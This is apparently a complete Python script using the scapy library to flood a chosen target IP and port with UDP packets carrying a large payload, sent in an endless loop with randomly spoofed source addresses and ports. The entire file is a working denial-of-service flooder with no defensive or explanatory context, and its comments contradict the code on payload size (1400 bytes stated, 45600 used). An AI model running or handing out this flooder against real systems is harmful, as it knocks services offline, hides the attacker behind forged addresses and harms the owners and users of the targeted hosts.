from scapy.all import *
import random

target_ip = "127.0.0.1"  # Replace with your target IP
target_port = 80             # Target port (e.g., HTTP or any open port)

# Large payload (e.g., 1400 bytes of random data)
payload = "X" * 45600  # Adjust size as needed (max ~1500 for Ethernet MTU)



while True:
    src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))  # Spoofed source IP
    src_port = random.randint(1024, 65535)  # Random source port

    # Craft a UDP packet with large payload
    ip = IP(src=src_ip, dst=target_ip)
    udp = UDP(sport=src_port, dport=target_port)
    packet = ip / udp / payload

    # Send the packet
    send(packet, verbose=0)
    print(f"Sent {len(packet)} bytes from {src_ip}:{src_port}")